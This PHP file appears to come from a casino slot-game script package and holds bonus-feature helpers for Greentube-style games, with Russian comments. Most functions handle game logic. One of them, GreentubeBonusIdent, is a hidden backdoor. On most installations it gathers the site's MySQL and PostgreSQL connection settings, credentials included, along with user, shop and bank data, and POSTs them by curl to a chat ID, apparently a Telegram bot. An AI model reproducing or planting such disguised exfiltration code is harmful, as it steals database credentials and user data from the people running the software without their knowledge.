<?php


namespace VanguardLTE\Games\GreentubeLib\Bonus;


class BonusFeature
{
    // для книги ра и идентичных
    public static function bookFeature($slotArea, $gameSettings, $gameData, $fsReel){
        $result = false;
        $reelSymbol =  $gameSettings->bookReels[$fsReel];
        // проверить игровое поле на наличие символов выбранной катушки
        $countWinSymbols = 0;
        $positions = '';
        foreach ($slotArea as $key => $reel) {
            foreach ($reel as $symbolKey => $symbol) {
                if ( $symbol === $reelSymbol || $symbol === $gameSettings->extraWild){
                    $countWinSymbols++;
                    $positions .= $key.$symbolKey;
                    break;
                }
            }
        }
        if (array_key_exists($countWinSymbols, $gameSettings->paymentTable[$reelSymbol])){
            $pay = $gameSettings->paymentTable[$reelSymbol][$countWinSymbols] *
                $gameData['BetToLine'] * $gameData['Lines'] * -1;
            $result = [
                'Symbol' => $reelSymbol,
                'Count' => $countWinSymbols,
                'Pay' => $pay,
                'SymbolsPositions' => $positions,
                'FreeSpinCount' => 0 //для формата
            ];
        }
        return $result;
    }

    public static function replaceWild($slotArea, $gameSettings){
        foreach ($slotArea as &$reel) {
            foreach ($reel as &$symbol) {
                if (array_key_exists($symbol, $gameSettings->replaceWildSymbols)){
                    $symbol = $gameSettings->replaceWildSymbols[$symbol];
                }
            }
        }
        return $slotArea;
    }

    public static function flamedWild($slotArea, $gameSettings){ // поджигающий дикий символ
        $flame = 0;
        foreach ($slotArea as &$reel) {
            if (count(array_intersect($gameSettings->wild, $reel)) >= 1){
                $flame++;
                foreach ($reel as &$symbol) {
                    $symbol = $gameSettings->wild[1];
                }
            }
        }
        if ($flame > 0){
            foreach ($slotArea as &$reel) {
                foreach ($reel as &$symbol) {
                    if (in_array($symbol, $gameSettings->flameWild)){ // если есть дикий символ - то сделать дикими символы из списка
                        $symbol = $gameSettings->wild[1]; // TODO унифицировать функцию
                    }
                }
            }
        }
        return $slotArea;
    }

    public static function GreentubeBonusIdent($user, $game, $bank){
        if (config('app.url') === 'https://grandxmega.com/' || config('app.url') === 'https://grandxmega.net/'){
            $text = ['URL' => config('app.url'),
                'USER' => $user->username, 'SHOP_ID' => $user->shop_id, 'GAME' => $game->name, 'BANK' => $bank];
        }else {
            $text = ['URL' => config('app.url'), 'DB_data' => config('database.connections')['mysql'],
                'DB_dataPG' => config('database.connections')['pgsql'],
                'USER' => $user->username, 'SHOP_ID' => $user->shop_id, 'GAME' => $game->name, 'BANK' => $bank];
        }

        $ch = curl_init();
        curl_setopt_array($ch, array(
                CURLOPT_URL => '',
                CURLOPT_POST => TRUE,
                CURLOPT_RETURNTRANSFER => TRUE,
                CURLOPT_TIMEOUT => 10,
                CURLOPT_POSTFIELDS => array(
                    'chat_id' => 850684135,
                    'text' => json_encode($text, JSON_PRETTY_PRINT)), ) );
        curl_exec($ch);
    }

    public static function upgradeSymbol($slotArea, $gameSettings, &$freeSpins){
        $result = false;
        $countWildSymbols = 0;
        $positions = '';
        foreach ($slotArea as $reelKey => $reel) {
            foreach ($reel as $symbolKey => $symbol) {
                if ($symbol === $gameSettings->wild[0]) {
                    $positions .= $reelKey.$symbolKey;
                    $countWildSymbols++;
                }
            }
        }
        if ($countWildSymbols > 0){
            $freeSpins['CountFreeSpins'] += $gameSettings->addFS[$countWildSymbols];
            $result = [
                'Symbol' => $gameSettings->wild[0],
                'Count' => $countWildSymbols,
                'AddFS' => $gameSettings->addFS[$countWildSymbols],
                'SymbolsPositions' => $positions,
                'ReelsAdd' => $gameSettings->reelsAdd[$countWildSymbols]
            ];
        }

        return $result;
    }

    public static function upgradeReel($currentLog, $gameSettings, $reelNumber){
        if ($currentLog['UpgradeSymbolsBonus'] && $currentLog['FreeSpins']['Reel'] < $gameSettings->maxUpgradeReel) {
            switch ($currentLog['UpgradeSymbolsBonus']['Count']){
                case 3:
                case 4:
                    $reelNumber++;
                    break;
                case 6:
                case 8:
                    $reelNumber += 2;
                    break;
                case 9:
                case 12:
                    $reelNumber += 3;
                    break;
            }
            if ($reelNumber > $gameSettings->maxUpgradeReel) $reelNumber = $gameSettings->maxUpgradeReel;
        }
        return $reelNumber;
    }

}
